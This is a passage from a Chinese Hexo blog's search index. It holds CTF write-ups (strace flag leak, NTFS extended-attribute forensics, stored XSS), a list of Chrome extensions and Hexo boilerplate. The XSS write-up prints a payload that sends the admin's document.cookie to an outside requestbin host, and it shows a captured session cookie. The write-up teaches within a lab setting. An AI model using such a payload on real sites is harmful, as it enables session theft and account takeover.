temporarily unavailable)</span><br><span class="line">[pid   193] <span class="built_in">read</span>(3, <span class="string">&quot;Username: brewtoot password: CTF&#123;4efcc72090af28fd33a2118985541f92e793477f&#125;\t166.00 IS-19 2019/05/09 00:00:00\tSwath 640km\tRevisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m\tDaily acquisition capacity: 220,000km\302\262\tRemaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E\n&quot;</span>, 4096) = 363</span><br><span class="line">Username: brewtoot password: ********************     166.00 IS-19 2019/05/09 00:00:00                            Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m          Daily acquisition capacity: 220,000km²   Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E</span><br><span class="line"></span><br><span class="line">[pid   193] <span class="built_in">read</span>(0,</span><br></pre></td></tr></table></figure><ul><li>pid 193进程read中，password明文显示flag</li><li>==<strong>flag：CTF{4efcc72090af28fd33a2118985541f92e793477f}</strong>==</li></ul><h2 id="03-home-computer-forensics"><a href="#03-home-computer-forensics" class="headerlink" title="03 home computer(forensics)"></a>03 home computer(forensics)</h2><ul><li><p>forensics:取证</p></li><li><p>解压得到 note.txt、 family.ntfs</p></li><li><p>加载family.ntfs有两种方法：</p></li><li><p>方法一：7.zip<br>（支援的檔案格式：压缩／解压缩：7z、XZ、BZIP2、GZIP、TAR、ZIP 及 WIM//解压缩：AR、ARJ、CAB、CHM、CPIO、CramFS、DMG、EXT、FAT、GPT、HFS、IHEX、ISO、LZH、LZMA、MBR、MSI、NSIS、NTFS、QCOW2、RAR、RPM、SquashFS、UDF、UEFI、VDI、VHD、VMDK、WIM、XAR 及 Z)</p></li><li><p>方法二：linux 挂载(kali)</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 mount -t ntfs ./family.ntfs /mnt</span><br></pre></td></tr></table></figure><ul><li>进入路径：/mnt/Users/Family/Documents ，查看credentials.txt</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 cat credentials.txt</span><br><span class="line"></span><br><span class="line">I keep pictures of my credentials <span class="keyword">in</span> extended attributes.</span><br></pre></td></tr></table></figure><ul><li>利用attr查看扩展文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 attr -l credentials.txt </span><br><span class="line">Attribute <span class="string">&quot;FILE0&quot;</span> has a 38202 byte value <span class="keyword">for</span> credentials.txt</span><br><span class="line">⚡ root@r10 attr -g  FILE0 -q credentials.txt &gt; flag</span><br><span class="line">⚡ root@r10 file flag</span><br><span class="line">flag: PNG image data, 1234 x 339, 8-bit/color RGB, non-interlaced</span><br></pre></td></tr></table></figure><ul><li>利用getfattr查看扩展文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 getfattr credentials.txt  </span><br><span class="line"><span class="comment"># file: credentials.txt</span></span><br><span class="line">user.FILE0</span><br><span class="line">⚡ root@r10 getfattr --only-values credentials.txt &gt; image.png</span><br></pre></td></tr></table></figure><ul><li>查看图片得到flag</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 eog flag</span><br></pre></td></tr></table></figure><ul><li>==<strong>flag：CTF{congratsyoufoundmycreds}</strong>==</li></ul><h2 id="04-Government-Agriculture-Network-web"><a href="#04-Government-Agriculture-Network-web" class="headerlink" title="04 Government Agriculture Network(web)"></a>04 Government Agriculture Network(web)</h2><ul><li>目标页面<a href="https://govagriculture.web.ctfcompetition.com/">https://govagriculture.web.ctfcompetition.com/</a></li><li>尝试Create a new post，得到信息：Your post was submitted for review. Administator will take a look shortly.</li><li>分析：administator再次登录将留下cookie，尝试xss攻击</li><li>利用<a href="http://requestbin.net/">http://requestbin.net/</a> 构建requset.（hettp://webhook.site亦可）</li><li>Make a request to get started</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $result = file_get_contents(<span class="string">&#x27;http://requestbin.net/r/15ietu11&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>xss注入</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">location.href=<span class="string">&#x27;http://requestbin.net/r/14bfl601?test=&#x27;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>查看request信息，得到flag</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test: flag=CTF&#123;8aaa2f34b392b415601804c2f5f0f24e&#125;; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV</span><br></pre></td></tr></table></figure><ul><li>==<strong>flag：CTF{8aaa2f34b392b415601804c2f5f0f24e}</strong>==</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>google Chrome 插件推荐</title>
    <link href="/2019/09/15/google%20Chrome%20%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    <url>/2019/09/15/google%20Chrome%20%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<h2 id="Chrome插件推荐"><a href="#Chrome插件推荐" class="headerlink" title="Chrome插件推荐"></a>Chrome插件推荐</h2><p><strong>(没有插件的Chrome是没有灵魂的！！！)</strong></p><p><u>安装插件，请打开Chrome开发者模式</u></p><p><u>Chrome插件安装通用教程：<a href="https://www.jianshu.com/p/12ca04c61fc6">https://www.jianshu.com/p/12ca04c61fc6</a></u></p><ul><li>YouTube Video Downloader ：油管视频音频下载<a href="https://addoncrop.com/youtube_video_downloader/">https://addoncrop.com/youtube_video_downloader/</a> （下载zip包解压，在Chrome扩展程序中，将文件夹拖入即可）</li><li>bilibili哔哩哔哩下载助手 ：bilibili 哔哩哔哩B站下载助手 帮你下载版权受限（能看不能缓存）的 番剧 视频</li><li>Momentum ：提供一个清新简单的浏览器主页面</li><li>Dark Reader  ： 黑色主题，适用于任何网站。关爱眼睛，就使用Dark Reader进行夜间和日间浏览</li><li>Google学术搜索  ：可让您在浏览网页时查询学术文章</li><li>Project Naptha ： 文本识别，突出显示、复制、编辑和翻译web上任何图像中的文本</li><li>AdBlock : 拦截网页上的广告</li><li>Search by Image (by Google) : 点击右键即可在google上搜索图片</li><li>捕捉网页截图 ： 捕捉网页截图，编辑并将它们保存为PDF，JPEG，GIF，PNG或BMP；上传，打印，在Photoshop中打开，复制到剪贴板或电子邮件</li></ul>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
    <tags>
      
      <tag>software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2019/09/15/hello-world/"/>
    <url>/2019/09/15/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
